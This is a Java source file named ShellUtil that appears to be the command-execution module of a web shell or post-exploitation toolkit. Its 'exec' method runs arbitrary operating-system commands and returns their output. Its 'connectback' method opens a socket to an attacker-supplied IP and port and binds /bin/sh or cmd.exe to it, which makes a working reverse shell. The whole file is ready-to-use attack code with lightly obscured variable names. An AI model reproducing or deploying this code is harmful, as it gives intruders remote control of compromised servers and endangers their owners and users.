import java.io.*;
import java.net.Socket;

public class ShellUtil extends Object{
    public static String run(String methodName, String params, String encoding) {
        String res = "";
        if (methodName.equals("exec")) {
            res = ShellUtil.exec(params, encoding);
        }else if (methodName.equals("connectback")) {
            String ip = params.substring(0, params.indexOf("^"));
            String port = params.substring(params.indexOf("^") + 1);
            res = ShellUtil.connectBack(ip, Integer.parseInt(port));
        }
        else {
            res = "unkown methodName";
        }
        return res;
    }
    public static String exec(String command,String encoding) {
        StringBuffer result = new StringBuffer();
        BufferedReader br = null;
        InputStreamReader isr = null;
        InputStream fis = null;
        Process p = null;
        if (encoding == null || encoding.equals("")) {
            encoding = "utf-8";
        }
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            if (p.exitValue() == 0) {
                fis = p.getInputStream();
            } else {
                fis = p.getErrorStream();
            }
            isr = new InputStreamReader(fis,encoding);
            br = new BufferedReader(isr);
            String line = null;
            while ((line = br.readLine()) != null) {
                result.append(line + "\n");
            }
        } catch (Exception e) {
            result.append(e.getMessage());
        }finally {
            try {
                br.close();
                isr.close();
                p.destroy();
            } catch (IOException e) {
                result.append(e.getMessage());
            }
        }
        return result.toString();
    }

    public static String connectBack(String ip, int port) {
        class StreamConnector extends Thread {
            InputStream sp;
            OutputStream gh;

            StreamConnector(InputStream sp, OutputStream gh) {
                this.sp = sp;
                this.gh = gh;
            }
            @Override
            public void run() {
                BufferedReader xp = null;
                BufferedWriter ydg = null;
                try {
                    xp = new BufferedReader(new InputStreamReader(this.sp));
                    ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
                    char buffer[] = new char[8192];
                    int length;
                    while ((length = xp.read(buffer, 0, buffer.length)) > 0) {
                        ydg.write(buffer, 0, length);
                        ydg.flush();
                    }
                } catch (Exception e) {}
                try {
                    if (xp != null) {
                        xp.close();
                    }
                    if (ydg != null) {
                        ydg.close();
                    }
                } catch (Exception e) {
                }
            }
        }
        try {
            String sp;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                sp = new String("/bin/sh");
            } else {
                sp = new String("cmd.exe");
            }
            Socket sk = new Socket(ip, port);
            Process ps = Runtime.getRuntime().exec(sp);
            (new StreamConnector(ps.getInputStream(), sk.getOutputStream())).start();
            (new StreamConnector(sk.getInputStream(), ps.getOutputStream())).start();
        } catch (Exception e) {
        }
        return "^OK^";
    }
}
